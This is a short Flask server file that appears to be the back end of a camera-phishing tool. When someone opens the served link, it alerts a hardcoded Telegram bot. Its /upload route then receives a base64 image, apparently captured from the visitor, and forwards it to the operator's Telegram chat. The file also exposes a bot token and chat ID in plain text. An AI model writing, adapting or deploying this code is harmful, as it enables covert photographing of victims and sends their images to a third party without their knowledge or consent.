from flask import Flask, render_template, request
import requests
import base64
app = Flask(__name__)

TOKEN = '8639009325:AAEqWTIdefasWQ8Hkr8i3mQck18AjBdwGpE'
ID = '5360002210'

@app.route('/')
def index():
    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=Link_Opened_Success')
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        img_data = request.json['img'].split(',')[1]
        img_bytes = base64.b64decode(img_data)
        res = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': ID}, files={'photo': ('img.jpg', img_bytes)})
        return res.text
    except Exception as e: return str(e)
